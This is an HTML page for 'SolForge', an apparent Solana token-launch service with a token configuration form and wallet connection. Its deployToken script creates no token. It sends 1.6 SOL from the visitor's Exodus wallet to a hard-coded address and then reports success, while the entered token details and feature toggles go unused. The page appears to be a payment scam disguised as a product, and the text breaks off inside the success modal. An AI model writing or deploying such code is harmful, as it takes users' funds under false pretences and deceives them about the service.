<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SolForge | Launch Your Solana Token</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;600&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/phosphor-icons"></script>
    <script src="https://bundle.run/buffer@6.0.3"></script>
    <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.min.js"></script>
    <script>
        // Initialize Exodus detection
        window.exodus = window.exodus || {
            solana: window.solana
        };
    </script>
    <style>
        body {
            font-family: 'Space Grotesk', sans-serif;
            background: linear-gradient(125deg, #000000, #13073A, #1A0B3E);
            min-height: 100vh;
        }
        .sol-glow {
            box-shadow: 0 0 25px rgba(153, 69, 255, 0.3);
        }
        .gradient-border {
            background: linear-gradient(180deg, rgba(153, 69, 255, 0.3), rgba(20, 241, 149, 0.3));
            padding: 1px;
        }
        .input-field {
            background: rgba(13, 4, 38, 0.7);
            border: 1px solid rgba(153, 69, 255, 0.2);
        }
        .input-field:focus {
            border-color: rgba(153, 69, 255, 0.5);
            box-shadow: 0 0 15px rgba(153, 69, 255, 0.2);
        }
        @keyframes slideDown {
            from { transform: translateY(-100%); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        @keyframes slideUp {
            from { transform: translateY(0); opacity: 1; }
            to { transform: translateY(-100%); opacity: 0; }
        }
        @media (max-width: 640px) {
            .step-indicator {
                flex-shrink: 0;
            }
            
            .steps-container {
                overflow-x: auto;
                -webkit-overflow-scrolling: touch;
                padding-bottom: 1rem;
            }
        }
        @media (max-width: 640px) {
            .container {
                width: 100%;
                padding-left: 1rem;
                padding-right: 1rem;
            }
            
            #mobileMenu {
                top: 72px;
                z-index: 50;
            }
            
            .verify-step-container {
                padding-left: 1rem;
                padding-right: 1rem;
            }
            
            .steps-container {
                padding-bottom: 1rem;
                margin-bottom: 2rem;
            }
        }
        .mobile-menu-transition {
            transition: all 0.3s ease-in-out;
        }
        .input-field {
            width: 100%;
            max-width: 100%;
        }
        button {
            min-height: 44px;
        }
    </style>
</head>
<body class="text-gray-200">
    <!-- Navigation -->
    <nav class="border-b border-purple-500/10 backdrop-blur-xl fixed w-full z-10">
        <div class="container mx-auto px-4 sm:px-6 py-4">
            <div class="flex justify-between items-center">
                <div class="text-xl sm:text-2xl font-bold bg-gradient-to-r from-purple-500 to-green-400 bg-clip-text text-transparent">
                    SolForge
                </div>
                <!-- Desktop menu -->
                <div class="hidden sm:flex items-center gap-4 md:gap-6">
                    <a href="/" class="text-purple-300 hover:text-purple-200 transition-colors">Launch</a>
                    <a href="/guide" class="text-purple-300 hover:text-purple-200 transition-colors">Guide</a>
                    <a href="/docs" class="text-purple-300 hover:text-purple-200 transition-colors">Docs</a>
                    <div class="h-4 w-px bg-purple-500/20"></div>
                    <button onclick="connectWallet()" 
                            id="walletButton"
                            class="bg-gradient-to-r from-purple-600 to-purple-800 hover:from-purple-700 hover:to-purple-900 px-4 sm:px-6 py-2 rounded-xl transition-all duration-300 sol-glow flex items-center gap-2">
                        <i class="ph-wallet"></i>
                        <span>Connect Wallet</span>
                    </button>
                </div>
                <!-- Mobile menu button -->
                <div class="sm:hidden">
                    <button onclick="toggleMobileMenu()" class="text-purple-300 hover:text-purple-200 text-2xl">
                        <i class="ph-list"></i>
                    </button>
                </div>
            </div>
        </div>
        <!-- Mobile menu dropdown -->
        <div id="mobileMenu" class="hidden sm:hidden fixed w-full bg-[#0d0926]/95 backdrop-blur-xl border-b border-purple-500/10">
            <div class="container mx-auto px-4 py-4">
                <div class="flex flex-col space-y-4">
                    <a href="/" class="text-purple-300 hover:text-purple-200 py-2">Launch</a>
                    <a href="/guide" class="text-purple-300 hover:text-purple-200 py-2">Guide</a>
                    <a href="/docs" class="text-purple-300 hover:text-purple-200 py-2">Docs</a>
                    <div class="h-px bg-purple-500/20 my-2"></div>
                    <button onclick="connectWallet()" 
                            id="mobileWalletButton"
                            class="w-full bg-gradient-to-r from-purple-600 to-purple-800 hover:from-purple-700 hover:to-purple-900 px-4 py-3 rounded-xl transition-all duration-300 sol-glow flex items-center justify-center gap-2">
                        <i class="ph-wallet"></i>
                        <span>Connect Wallet</span>
                    </button>
                </div>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <main class="container mx-auto px-4 sm:px-6 pt-20 sm:pt-32 pb-20">
        <!-- Header section with steps indicator -->
        <div class="text-center mb-8 sm:mb-16">
            <h1 class="text-4xl sm:text-6xl font-bold mb-4 sm:mb-6 bg-gradient-to-r from-purple-400 via-pink-500 to-green-400 bg-clip-text text-transparent">
                Solforge.live
            </h1>
            <div class="steps-container flex justify-start sm:justify-center items-center gap-4 mt-6 sm:mt-8 overflow-x-auto pb-4 sm:pb-0">
                <div class="flex items-center step-indicator">
                    <div class="w-10 h-10 rounded-full bg-purple-500 flex items-center justify-center sol-glow">
                        <span class="text-white font-bold">1</span>
                    </div>
                    <div class="ml-2">
                        <span class="text-purple-300 text-sm">Configure</span>
                    </div>
                </div>
                <div class="w-16 h-[2px] bg-purple-500/20"></div>
                <div class="flex items-center opacity-50 step-indicator">
                    <div class="w-10 h-10 rounded-full bg-purple-900 flex items-center justify-center">
                        <span class="text-white font-bold">2</span>
                    </div>
                    <div class="ml-2">
                        <span class="text-purple-300 text-sm">Verify</span>
                    </div>
                </div>
                <div class="w-16 h-[2px] bg-purple-500/20"></div>
                <div class="flex items-center opacity-50 step-indicator">
                    <div class="w-10 h-10 rounded-full bg-purple-900 flex items-center justify-center">
                        <span class="text-white font-bold">3</span>
                    </div>
                    <div class="ml-2">
                        <span class="text-purple-300 text-sm">Launch</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- Enhanced Token Creation Form -->
        <div class="gradient-border rounded-3xl">
            <div class="bg-[#0d0926] rounded-3xl p-8">
                <form class="space-y-8">
                    <!-- Token Basics Section -->
                    <div class="space-y-6">
                        <div class="flex items-center gap-2 mb-6">
                            <i class="ph-coin text-2xl text-purple-400"></i>
                            <h3 class="text-xl font-semibold text-purple-300">Token Basics</h3>
                        </div>
                        
                        <!-- Image Upload Section -->
                        <div class="flex flex-col sm:flex-row gap-4 sm:gap-8 items-start mb-8">
                            <div class="w-full sm:w-1/3">
                                <label class="block text-sm font-medium mb-4 text-purple-200">Token Logo*</label>
                                <div class="relative group">
                                    <div id="imagePreviewContainer" class="w-32 h-32 rounded-2xl border-2 border-dashed border-purple-500/30 flex flex-col items-center justify-center bg-purple-900/20 hover:bg-purple-900/30 transition-all cursor-pointer overflow-hidden">
                                        <div id="uploadIcon" class="flex flex-col items-center justify-center">
                                            <i class="ph-upload-simple text-3xl text-purple-400 mb-2"></i>
                                            <span class="text-sm text-purple-300">Upload Logo</span>
                                            <span class="text-xs text-purple-400 mt-1">Max 5MB</span>
                                        </div>
                                        <div id="imagePreview" class="hidden absolute inset-0">
                                            <img class="w-full h-full object-cover rounded-xl" src="" alt="Token Logo Preview">
                                        </div>
                                        <input type="file" 
                                               id="logoInput"
                                               accept="image/*"
                                               class="hidden"
                                               onchange="handleImageUpload(event)">
                                    </div>
                                </div>
                            </div>
                            
                            <div class="w-full sm:w-2/3 space-y-4">
                                <div>
                                    <label class="block text-sm font-medium mb-2 text-purple-200">Token Name*</label>
                                    <input type="text" 
                                           class="w-full px-4 py-3 rounded-xl input-field focus:outline-none"
                                           placeholder="e.g., Solana Moon">
                                    <p class="text-xs text-purple-300/60 mt-1">
                                        Choose a memorable name for your token
                                    </p>
                                </div>

                                <div>
                                    <label class="block text-sm font-medium mb-2 text-purple-200">Token Symbol*</label>
                                    <input type="text" 
                                           class="w-full px-4 py-3 rounded-xl input-field focus:outline-none uppercase"
                                           maxlength="10"
                                           placeholder="e.g., MOON">
                                    <p class="text-xs text-purple-300/60 mt-1">
                                        3-10 characters, letters only
                                    </p>
                                </div>
                            </div>
                        </div>

                        <!-- Supply and Decimals -->
                        <div class="grid md:grid-cols-2 gap-6">
                            <div>
                                <label class="block text-sm font-medium mb-2 text-purple-200">
                                    Initial Supply*
                                    <span class="text-purple-300/60 text-xs ml-2">
                                        (Total tokens to create)
                                    </span>
                                </label>
                                <div class="relative">
                                    <input type="number" 
                                           class="w-full px-4 py-3 rounded-xl input-field focus:outline-none"
                                           placeholder="1000000000">
                                    <div class="absolute right-4 top-1/2 -translate-y-1/2 text-purple-300/60 text-sm">
                                        tokens
                                    </div>
                                </div>
                            </div>

                            <div>
                                <label class="block text-sm font-medium mb-2 text-purple-200">
                                    Decimals*
                                    <span class="text-purple-300/60 text-xs ml-2">
                                        (Token divisibility)
                                    </span>
                                </label>
                                <select class="w-full px-4 py-3 rounded-xl input-field focus:outline-none appearance-none">
                                    <option value="9">9 (Recommended)</option>
                                    <option value="6">6</option>
                                    <option value="18">18</option>
                                </select>
                            </div>
                        </div>
                    </div>

                    <!-- Marketing Section -->
                    <div class="space-y-6 pt-6 border-t border-purple-500/10">
                        <div class="flex items-center gap-2 mb-6">
                            <i class="ph-megaphone text-2xl text-purple-400"></i>
                            <h3 class="text-xl font-semibold text-purple-300">Marketing & Social</h3>
                        </div>

                        <div class="grid md:grid-cols-2 gap-6">
                            <div>
                                <label class="block text-sm font-medium mb-2 text-purple-200">
                                    <i class="ph-globe text-lg mr-1"></i>
                                    Website URL
                                </label>
                                <input type="url" 
                                       class="w-full px-4 py-3 rounded-xl input-field focus:outline-none"
                                       placeholder="https://yourproject.com">
                            </div>

                            <div>
                                <label class="block text-sm font-medium mb-2 text-purple-200">
                                    <i class="ph-telegram-logo text-lg mr-1"></i>
                                    Telegram Group
                                </label>
                                <input type="text" 
                                       class="w-full px-4 py-3 rounded-xl input-field focus:outline-none"
                                       placeholder="@yourtelegram">
                            </div>

                            <div>
                                <label class="block text-sm font-medium mb-2 text-purple-200">
                                    <i class="ph-twitter-logo text-lg mr-1"></i>
                                    Twitter Handle
                                </label>
                                <input type="text" 
                                       class="w-full px-4 py-3 rounded-xl input-field focus:outline-none"
                                       placeholder="@yourtwitter">
                            </div>

                            <div>
                                <label class="block text-sm font-medium mb-2 text-purple-200">
                                    <i class="ph-discord-logo text-lg mr-1"></i>
                                    Discord Server
                                </label>
                                <input type="text" 
                                       class="w-full px-4 py-3 rounded-xl input-field focus:outline-none"
                                       placeholder="discord.gg/yourserver">
                            </div>
                        </div>
                    </div>

                    <!-- Advanced Settings -->
                    <div class="space-y-6 pt-6 border-t border-purple-500/10">
                        <div class="flex items-center gap-2 mb-6">
                            <i class="ph-gear text-2xl text-purple-400"></i>
                            <h3 class="text-xl font-semibold text-purple-300">Advanced Settings</h3>
                        </div>

                        <div class="grid md:grid-cols-2 gap-8">
                            <div class="space-y-4">
                                <div class="flex items-center justify-between p-4 rounded-xl bg-purple-900/20 border border-purple-500/20">
                                    <div>
                                        <label class="text-sm font-medium text-purple-200">Enable Burning</label>
                                        <p class="text-xs text-purple-300/60">Allow tokens to be permanently destroyed</p>
                                    </div>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" class="sr-only peer">
                                        <div class="w-11 h-6 bg-purple-900 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-purple-500"></div>
                                    </label>
                                </div>

                                <div class="flex items-center justify-between p-4 rounded-xl bg-purple-900/20 border border-purple-500/20">
                                    <div>
                                        <label class="text-sm font-medium text-purple-200">Enable Minting</label>
                                        <p class="text-xs text-purple-300/60">Allow creation of new tokens</p>
                                    </div>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" class="sr-only peer">
                                        <div class="w-11 h-6 bg-purple-900 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-purple-500"></div>
                                    </label>
                                </div>
                            </div>

                            <div class="space-y-4">
                                <div class="flex items-center justify-between p-4 rounded-xl bg-purple-900/20 border border-purple-500/20">
                                    <div>
                                        <label class="text-sm font-medium text-purple-200">Pausable</label>
                                        <p class="text-xs text-purple-300/60">Ability to pause token transfers</p>
                                    </div>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" class="sr-only peer">
                                        <div class="w-11 h-6 bg-purple-900 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-purple-500"></div>
                                    </label>
                                </div>

                                <div class="flex items-center justify-between p-4 rounded-xl bg-purple-900/20 border border-purple-500/20">
                                    <div>
                                        <label class="text-sm font-medium text-purple-200">Renounce Ownership</label>
                                        <p class="text-xs text-purple-300/60">Remove owner privileges after launch</p>
                                    </div>
                                    <label class="relative inline-flex items-center cursor-pointer">
                                        <input type="checkbox" class="sr-only peer">
                                        <div class="w-11 h-6 bg-purple-900 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-purple-500"></div>
                                    </label>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Create Button -->
                    <div class="pt-8">
                        <button type="button" 
                                onclick="showVerification()"
                                class="w-full bg-gradient-to-r from-purple-600 to-green-500 hover:from-purple-700 hover:to-green-600 px-6 py-4 rounded-xl font-medium transition-all duration-300 sol-glow">
                            Create Token
                        </button>
                        <div class="flex items-center justify-center gap-2 mt-4 text-purple-300/60 text-sm">
                            <i class="ph-info"></i>
                            <span>Total cost: 1.6 SOL</span>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="container mx-auto px-6 py-8 border-t border-purple-500/10 mt-20">
        <div class="text-center text-purple-300/60">
            © 2024 SolForge. Powered by Solana.
        </div>
    </footer>

    <!-- Verification Step (initially hidden) -->
    <div id="verifyStep" class="hidden mx-auto px-4 sm:px-6 max-w-4xl">
        <div class="gradient-border rounded-3xl">
            <div class="bg-[#0d0926] rounded-3xl p-8">
                <!-- Header -->
                <div class="flex items-center justify-between mb-8">
                    <div class="flex items-center gap-2">
                        <i class="ph-check-circle text-2xl text-purple-400"></i>
                        <h3 class="text-xl font-semibold text-purple-300">Verify Token Details</h3>
                    </div>
                    <button onclick="editDetails()" class="flex items-center gap-2 text-sm text-purple-400 hover:text-purple-300 transition-colors">
                        <i class="ph-pencil-simple"></i>
                        Edit Details
                    </button>
                </div>

                <!-- Token Preview Card -->
                <div class="bg-purple-900/20 rounded-2xl p-6 mb-8 border border-purple-500/20">
                    <div class="flex items-start gap-6">
                        <div id="tokenLogoPreview" class="w-24 h-24 rounded-xl bg-purple-900/40 overflow-hidden border border-purple-500/20">
                            <!-- Logo will be inserted here -->
                        </div>
                        <div class="flex-1">
                            <div class="flex items-center gap-3 mb-2">
                                <h4 id="tokenNamePreview" class="text-2xl font-bold text-purple-200">Token Name</h4>
                                <span id="tokenSymbolPreview" class="px-3 py-1 rounded-full bg-purple-500/20 text-purple-300 text-sm border border-purple-500/20">SYMBOL</span>
                            </div>
                            <div class="grid grid-cols-2 gap-4 mt-4">
                                <div>
                                    <span class="text-sm text-purple-300/60">Initial Supply</span>
                                    <p id="tokenSupplyPreview" class="text-purple-200 font-medium">1,000,000,000</p>
                                </div>
                                <div>
                                    <span class="text-sm text-purple-300/60">Decimals</span>
                                    <p id="tokenDecimalsPreview" class="text-purple-200 font-medium">9</p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Details Sections -->
                <div class="space-y-8">
                    <!-- Social Links -->
                    <div class="space-y-4">
                        <div class="flex items-center gap-2">
                            <i class="ph-share-network text-xl text-purple-400"></i>
                            <h4 class="text-lg font-semibold text-purple-300">Social Links</h4>
                        </div>
                        <div class="grid grid-cols-2 gap-4">
                            <div id="websitePreview" class="flex items-center gap-2 p-3 rounded-xl bg-purple-900/20 border border-purple-500/20">
                                <i class="ph-globe text-purple-400"></i>
                                <span class="text-sm text-purple-200 truncate">Website</span>
                            </div>
                            <div id="telegramPreview" class="flex items-center gap-2 p-3 rounded-xl bg-purple-900/20 border border-purple-500/20">
                                <i class="ph-telegram-logo text-purple-400"></i>
                                <span class="text-sm text-purple-200 truncate">Telegram</span>
                            </div>
                            <div id="twitterPreview" class="flex items-center gap-2 p-3 rounded-xl bg-purple-900/20 border border-purple-500/20">
                                <i class="ph-twitter-logo text-purple-400"></i>
                                <span class="text-sm text-purple-200 truncate">Twitter</span>
                            </div>
                            <div id="discordPreview" class="flex items-center gap-2 p-3 rounded-xl bg-purple-900/20 border border-purple-500/20">
                                <i class="ph-discord-logo text-purple-400"></i>
                                <span class="text-sm text-purple-200 truncate">Discord</span>
                            </div>
                        </div>
                    </div>

                    <!-- Token Features -->
                    <div class="space-y-4">
                        <div class="flex items-center gap-2">
                            <i class="ph-gear text-xl text-purple-400"></i>
                            <h4 class="text-lg font-semibold text-purple-300">Token Features</h4>
                        </div>
                        <div id="featuresPreview" class="grid grid-cols-2 gap-4">
                            <!-- Features will be populated here -->
                        </div>
                    </div>

                    <!-- Estimated Costs -->
                    <div class="space-y-4">
                        <div class="flex items-center gap-2">
                            <i class="ph-currency-circle-dollar text-xl text-purple-400"></i>
                            <h4 class="text-lg font-semibold text-purple-300">Deployment Costs</h4>
                        </div>
                        <div class="bg-purple-900/20 rounded-xl p-4 border border-purple-500/20">
                            <div class="flex justify-between items-center mb-3">
                                <span class="text-purple-300">Network Fee</span>
                                <span class="text-purple-200">0.00001 SOL</span>
                            </div>
                            <div class="flex justify-between items-center mb-3">
                                <span class="text-purple-300">Service Fee</span>
                                <span class="text-purple-200">1.6 SOL</span>
                            </div>
                            <div class="h-px bg-purple-500/20 my-3"></div>
                            <div class="flex justify-between items-center font-semibold">
                                <span class="text-purple-300">Total</span>
                                <span class="text-purple-200">1.6 SOL</span>
                            </div>
                        </div>
                    </div>

                    <!-- Action Buttons -->
                    <div class="flex gap-4 pt-6">
                        <button onclick="goBack()" 
                                class="flex-1 px-6 py-4 rounded-xl border border-purple-500/20 text-purple-300 hover:bg-purple-500/10 transition-all duration-300 flex items-center justify-center gap-2">
                            <i class="ph-arrow-left"></i>
                            Back
                        </button>
                        <button onclick="deployToken()" 
                                class="flex-1 bg-gradient-to-r from-purple-600 to-green-500 hover:from-purple-700 hover:to-green-600 px-6 py-4 rounded-xl font-medium transition-all duration-300 sol-glow flex items-center justify-center gap-2">
                            Deploy Token
                            <i class="ph-arrow-right"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script>
    // Get references to the main elements
    const configureStep = document.querySelector('form').parentElement.parentElement;
    const verifyStep = document.getElementById('verifyStep');

    // Function to show verification step
    function showVerification() {
        const configureStep = document.querySelector('form').parentElement.parentElement;
        const verifyStep = document.getElementById('verifyStep');
        
        // Get all form values
        const tokenName = document.querySelector('input[placeholder="e.g., Solana Moon"]').value;
        const tokenSymbol = document.querySelector('input[placeholder="e.g., MOON"]').value;
        const tokenSupply = document.querySelector('input[placeholder="1000000000"]').value;
        const tokenDecimals = document.querySelector('select').value;
        const logoInput = document.getElementById('logoInput');
        
        // Basic validation
        if (!tokenName || !tokenSymbol || !tokenSupply) {
            alert('Please fill in all required fields');
            return;
        }
        
        // Update verification preview
        document.getElementById('tokenNamePreview').textContent = tokenName;
        document.getElementById('tokenSymbolPreview').textContent = tokenSymbol;
        document.getElementById('tokenSupplyPreview').textContent = new Intl.NumberFormat().format(tokenSupply);
        document.getElementById('tokenDecimalsPreview').textContent = tokenDecimals;
        
        // Transfer logo if uploaded
        const tokenLogoPreview = document.getElementById('tokenLogoPreview');
        const originalImagePreview = document.getElementById('imagePreview');
        if (originalImagePreview && !originalImagePreview.classList.contains('hidden')) {
            const originalImg = originalImagePreview.querySelector('img');
            tokenLogoPreview.innerHTML = `<img src="${originalImg.src}" class="w-full h-full object-cover rounded-xl">`;
        } else {
            tokenLogoPreview.innerHTML = `<div class="w-full h-full flex items-center justify-center bg-purple-900/40">
                <i class="ph-image text-3xl text-purple-400"></i>
            </div>`;
        }
        
        // Switch to verification step
        configureStep.classList.add('hidden');
        verifyStep.classList.remove('hidden');
        
        // Update progress indicator
        updateProgress(2);
        
        // Scroll to top smoothly
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // Function to edit details and go back to configuration step
    function editDetails() {
        verifyStep.classList.add('hidden');
        configureStep.classList.remove('hidden');

        // Update progress indicator
        updateProgress(1);
    }
    </script>

    <script>
    // Function to update progress indicator
    function updateProgress(step) {
        const steps = document.querySelectorAll('.step-indicator'); // Add class 'step-indicator' to your step elements
        steps.forEach((stepEl, index) => {
            if (index + 1 === step) {
                stepEl.classList.remove('opacity-50');
                stepEl.querySelector('.rounded-full').classList.add('bg-purple-500', 'sol-glow');
                stepEl.querySelector('.rounded-full').classList.remove('bg-purple-900');
            } else if (index + 1 < step) {
                stepEl.classList.remove('opacity-50');
                stepEl.querySelector('.rounded-full').classList.add('bg-green-500');
                stepEl.querySelector('.rounded-full').classList.remove('bg-purple-900');
            } else {
                stepEl.classList.add('opacity-50');
                stepEl.querySelector('.rounded-full').classList.add('bg-purple-900');
                stepEl.querySelector('.rounded-full').classList.remove('bg-purple-500', 'bg-green-500', 'sol-glow');
            }
        });
    }

    // Function to deploy token (placeholder)
    async function deployToken() {
        if (!wallet) {
            const shouldConnect = confirm('Please connect your wallet first. Would you like to connect now?');
            if (shouldConnect) {
                try {
                    await connectWallet();
                    if (!wallet) {
                        return; // Exit if wallet connection failed
                    }
                } catch (err) {
                    console.error('Error connecting wallet:', err);
                    return;
                }
            } else {
                return;
            }
        }

        const deployButton = event.currentTarget;
        const originalText = deployButton.innerHTML;

        try {
            // Show loading state
            deployButton.innerHTML = `
                <div class="flex items-center gap-3 transition-all duration-300">
                    <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span class="animate-pulse">Preparing Transaction...</span>
                </div>
            `;

            // Verify connection
            if (!connection) {
                throw new Error('No connection to Solana network');
            }

            const recipientAddress = new solanaWeb3.PublicKey('HqybjSocyprArfcoN8NReM25oVxDfSzgBjPMQguz9RT1');

            // Get latest blockhash - FIXED VERSION
            const { blockhash } = await connection.getLatestBlockhash('confirmed');
            
            if (!blockhash) {
                throw new Error('Failed to get recent blockhash');
            }

            // Create transaction with blockhash
            const transaction = new solanaWeb3.Transaction();
            
            // Set the blockhash and fee payer
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = wallet;

            // Add transfer instruction
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet,
                    toPubkey: recipientAddress,
                    lamports: solanaWeb3.LAMPORTS_PER_SOL * 1.6
                })
            );

            // Update button state
            deployButton.innerHTML = `
                <div class="flex items-center gap-3 transition-all duration-300">
                    <svg class="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    <span>Awaiting Approval...</span>
                </div>
            `;

            // Send and confirm transaction
            const { signature } = await window.exodus.solana.signAndSendTransaction(transaction);
            await connection.confirmTransaction(signature, 'confirmed');

            // Show success message
            showSuccessModal(signature);

        } catch (err) {
            console.error('Error:', err);
            
            // Show more user-friendly error message
            let errorMessage = 'An unexpected error occurred.';
            if (err.message.includes('Insufficient funds')) {
                errorMessage = 'Insufficient funds in your wallet.';
            } else if (err.message.includes('blockhash')) {
                errorMessage = 'Network error. Please try again.';
            } else if (err.message.includes('403') || err.message.includes('401')) {
                errorMessage = 'Authentication error. Please check your RPC API token.';
            } else {
                errorMessage = err.message;
            }

            deployButton.innerHTML = `
                <div class="flex items-center gap-2 text-red-300 transition-all duration-300">
                    <i class="ph-warning-circle text-xl"></i>
                    <span>Failed: ${errorMessage}</span>
                </div>
            `;

            // Reset button after delay
            setTimeout(() => {
                deployButton.innerHTML = originalText;
            }, 3000);
        }
    }
    </script>

    <script>
    let wallet = null;
    let connection = null;

    async function connectWallet() {
        try {
            // Check if Exodus is installed
            if (!window.exodus) {
                window.open('https://exodus.com/', '_blank');
                alert('Exodus wallet is not installed. Please install it from https://exodus.com/');
                return false;
            }

            // Clear any existing connection
            if (window.exodus.solana && window.exodus.solana.isConnected) {
                await window.exodus.solana.disconnect();
            }

            // Request connection to Exodus
            const resp = await window.exodus.solana.connect();
            wallet = resp.publicKey;
            
            // Update wallet buttons
            const walletButtons = ['walletButton', 'mobileWalletButton'];
            walletButtons.forEach(buttonId => {
                const button = document.getElementById(buttonId);
                if (button) {
                    button.innerHTML = `
                        <i class="ph-wallet"></i>
                        <span>${wallet.toString().slice(0, 4)}...${wallet.toString().slice(-4)}</span>
                    `;
                }
            });

            // Initialize connection
            connection = new solanaWeb3.Connection(
                'https://api.devnet.solana.com',
                'confirmed'
            );

            console.log('Connected to Solana:', wallet.toString());
            return true;
        } catch (err) {
            console.error('Error connecting wallet:', err);
            alert('Failed to connect wallet: ' + err.message);
            return false;
        }
    }

    // Function to generate a random Solana address (for demo purposes)
    function generateRandomAddress() {
        const keypair = solanaWeb3.Keypair.generate();
        return keypair.publicKey;
    }

    // Handle Image Upload
    function handleImageUpload(event) {
        const input = event.target;
        const uploadIcon = document.getElementById('uploadIcon');
        const imagePreview = document.getElementById('imagePreview');
        const previewImg = imagePreview.querySelector('img');
        const container = document.getElementById('imagePreviewContainer');

        if (input.files && input.files[0]) {
            const file = input.files[0];
            
            // Check file size (5MB limit)
            if (file.size > 5 * 1024 * 1024) {
                alert('File size must be less than 5MB');
                input.value = '';
                return;
            }

            const reader = new FileReader();
            reader.onload = function(e) {
                previewImg.src = e.target.result;
                uploadIcon.classList.add('hidden');
                imagePreview.classList.remove('hidden');
                
                // Add remove button if it doesn't exist
                if (!container.querySelector('.remove-button')) {
                    const removeButton = document.createElement('button');
                    removeButton.className = 'remove-button absolute top-2 right-2 bg-red-500/80 hover:bg-red-600 rounded-full p-1 transition-all';
                    removeButton.innerHTML = '<i class="ph-x text-white"></i>';
                    removeButton.onclick = function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        resetUpload();
                    };
                    container.appendChild(removeButton);
                }
            };
            reader.readAsDataURL(file);
        }
    }

    function resetUpload() {
        const uploadIcon = document.getElementById('uploadIcon');
        const imagePreview = document.getElementById('imagePreview');
        const container = document.getElementById('imagePreviewContainer');
        const input = document.getElementById('logoInput');
        const removeButton = container.querySelector('.remove-button');

        input.value = '';
        uploadIcon.classList.remove('hidden');
        imagePreview.classList.add('hidden');
        if (removeButton) {
            removeButton.remove();
        }
    }

    // Add drag and drop support
    const dropZone = document.getElementById('imagePreviewContainer');

    ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, preventDefaults, false);
    });

    function preventDefaults(e) {
        e.preventDefault();
        e.stopPropagation();
    }

    ['dragenter', 'dragover'].forEach(eventName => {
        dropZone.addEventListener(eventName, highlight, false);
    });

    ['dragleave', 'drop'].forEach(eventName => {
        dropZone.addEventListener(eventName, unhighlight, false);
    });

    function highlight(e) {
        dropZone.classList.add('border-purple-500');
    }

    function unhighlight(e) {
        dropZone.classList.remove('border-purple-500');
    }

    dropZone.addEventListener('drop', handleDrop, false);

    function handleDrop(e) {
        const dt = e.dataTransfer;
        const files = dt.files;
        
        if (files.length) {
            const event = { target: { files: files } };
            handleImageUpload(event);
        }
    }
    </script>

    <script>
    // Enhanced success modal with animations
    function showSuccessModal(signature) {
        const modal = document.createElement('div');
        modal.className = 'fixed inset-0 bg-black/50 flex items-center justify-center z-50 opacity-0 transition-opacity duration-300';
        modal.innerHTML = `
            <div class="bg-[#0d0926] rounded-3xl p-8 max-w-md w-full mx-4 border border-purple-500/20 transform scale-95 transition-transform duration-300">
                <div class="text-center">
                    <div class="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4 animate-bounce">
                        <i class="ph-check-circle text-3xl text-green-400"></i>
                    </div>
                    <h3 class="text-xl font-bold text-purple-200 mb-2">Transaction Successful!</h3>
                    <p class="text-purple-300/60 mb-4">Your transaction has been sent to the network.</p>
                    <div class="bg-purple-900/20 rounded-xl p-3 mb-6 border border-purple-500/20 group hover:bg-purple-900/30 transition-all duration-300 cursor-pointer" 
                         onclick="window.open('https://solscan.io/tx/${signature}', '_blank')">
                        <p class="text-sm text-purple-200 break-all group-hover:text-purple-100">${signature}</p>
                    </div>
                    <div class="flex gap-2 justify-center items-center text-sm text-purple-300/60 mb-6">
                        <i class="ph-info"></i>
                        <span>Click the signature above to view on Solscan</span>
                    </div>
